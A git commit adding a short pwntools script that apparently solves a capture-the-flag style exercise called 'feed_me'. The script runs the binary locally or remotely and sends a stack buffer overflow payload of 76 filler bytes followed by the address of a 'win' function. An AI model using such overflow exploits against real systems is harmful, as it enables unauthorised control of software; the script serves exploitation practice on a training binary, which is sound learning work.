e1d8b7251cbaf55f51e870ba1a2ded0bbcce9ffe
jjamme <fnguyen2000@hotmail.com>
2021-05-23 14:30:24 +1000

    Change numbering

---
+++ 3_feed_me/3_feed_me_sol.py
@@ -0,0 +1,20 @@
+from pwn import *
+
+#context.log_level = "debug"
+remote_conn = False
+
+IP = ""
+PORT = ""
+FILENAME = "./4_feed_me"
+
+if remote_conn:
+    p = remote(IP, PORT)
+    elf = ELF(FILENAME)
+else:
+    p = process(FILENAME)
+    elf = p.elf
+
+payload = b"A"*76 + pack(elf.sym['win'])
+p.sendlineafter("something?", payload)
+
+p.interactive()
